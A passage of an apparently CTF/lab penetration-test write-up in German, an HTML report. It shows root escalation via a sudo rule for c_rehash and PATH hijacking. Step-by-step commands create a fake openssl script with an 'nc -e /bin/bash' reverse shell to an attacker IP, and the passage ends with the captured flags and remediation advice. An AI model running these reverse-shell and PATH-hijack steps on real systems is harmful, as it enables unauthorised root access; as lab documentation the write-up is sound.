+             <p class="comment">**Kurzbeschreibung:** Der Benutzer `maria` darf den Befehl `/usr/bin/c_rehash` als `root` ohne Passwort ausführen. Das `c_rehash`-Skript ruft intern das `openssl`-Binary auf, jedoch ohne einen absoluten Pfad anzugeben. Ein Angreifer als `maria` kann dies durch PATH Hijacking ausnutzen. Der Angreifer erstellt in einem von ihm kontrollierten Verzeichnis (z.B. `/home/maria` oder `/tmp`) ein bösartiges Skript mit dem Namen `openssl`, das einen Payload (z.B. eine Reverse Shell) enthält und macht dieses ausführbar. Anschließend führt der Angreifer den `sudo`-Befehl aus, manipuliert dabei aber die `PATH`-Umgebungsvariable so, dass das Verzeichnis mit dem bösartigen Skript vor den Standard-Systempfaden wie `/usr/bin` durchsucht wird (z.B. `sudo PATH=.:$PATH /usr/bin/c_rehash`). Das `c_rehash`-Skript findet nun beim Aufruf von `openssl` zuerst das bösartige Skript und führt es mit Root-Rechten aus.</p>
+             <p class="comment">**Voraussetzungen:** Zugriff als `maria`, unsichere Sudo-Regel für `c_rehash`, Schreibrechte in einem Verzeichnis, das im manipulierten PATH verwendet werden kann.</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Erstellen des bösartigen `openssl`-Skripts (z.B. in `/home/maria`) mit Shell-Payload: `echo '#!/bin/bash\nnc -e /bin/bash [Angreifer-IP] [Port]' > openssl`.</li>
+                 <li>Ausführbar machen: `chmod +x openssl`.</li>
+                 <li>Listener starten: `nc -lvnp [Port]`.</li>
+                 <li>Sudo-Befehl mit manipuliertem PATH ausführen: `sudo PATH=.:$PATH /usr/bin/c_rehash`.</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Das bösartige `openssl`-Skript wird als Root ausgeführt, eine Reverse Shell verbindet sich zum Listener.</p>
+             <p class="comment">**Beweismittel:** Die Sudo-Regel, das Hijacking-Skript und der erfolgreiche Shell-Empfang.</p>
+             <p class="comment">**Risikobewertung:** Hoch. Erlaubt Root-Eskalation durch Ausnutzung einer unsicheren Sudo-Regel und PATH-Manipulation.</p>
+             <p class="comment">**Empfehlungen:** Entfernen Sie die unsichere Sudo-Regel. Stellen Sie sicher, dass `secure_path` in `sudoers` gesetzt ist und Skripte, die via Sudo ausgeführt werden, interne Befehle mit vollem Pfad aufrufen.</p>
+         </section>
+
+        <section id="privilege-escalation-maria"> <!-- Continue section for Root Shell -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div> <span class="comment"><-- Fortsetzung Listener --></span>
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.146] 46292</span> <span class="password"><-- Root Shell! --></span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Netcat-Listener auf Port 4444 empfängt die Verbindung, ausgelöst durch den `c_rehash` PATH Hijack Exploit.</p>
+             <p class="evaluation">**Bewertung:** Root-Zugriff erfolgreich erlangt!</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren (optional, da direkt Root), Flags lesen.<br>**Empfehlung (Admin):** Sudo-Regel für `c_rehash` entfernen.</p>
+
+             <p class="comment">*(Shell-Stabilisierung wird im Log nicht gezeigt, aber eine Root-Shell ist vorhanden)*</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt"># <span class="command">cd /root</span></div>
+                      <div class="prompt"># <span class="command">cat root.txt</span></div>
+                      <pre><span class="password">hashhater</span></pre> <span class="comment"><-- Root Flag --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** In der Root-Shell wird die Root-Flag (`root.txt`) gelesen.</p>
+              <p class="evaluation">**Bewertung:** Root-Flag (`hashhater`) erfolgreich erhalten.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/marco/user.txt</div>
+                           <div class="flag-value"><span class="password">hashmanready</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">hashhater</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 13. Oktober 2022</p> <!-- Datum aus wget/exploit Logs -->
+    </footer>
+</body>
+</html>
